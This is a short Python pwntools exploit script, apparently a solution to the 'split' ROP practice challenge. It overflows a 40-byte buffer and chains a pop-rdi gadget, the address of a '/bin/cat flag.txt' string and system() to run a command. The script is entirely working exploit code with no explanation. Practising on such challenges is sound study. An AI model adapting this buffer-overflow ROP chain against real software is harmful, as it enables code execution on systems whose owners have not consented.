from pwn import *

r = process('./split')

win = 0x601060 #'/bin/cat flag.txt'
system = 0x0000000000400810 #system
poprdi = 0x00400883 #pop rdi

payload = ''
payload += "A" * 40
payload += p64(poprdi)
payload += p64(win)
payload += p64(system)

r.sendlineafter("> ", payload)
r.interactive()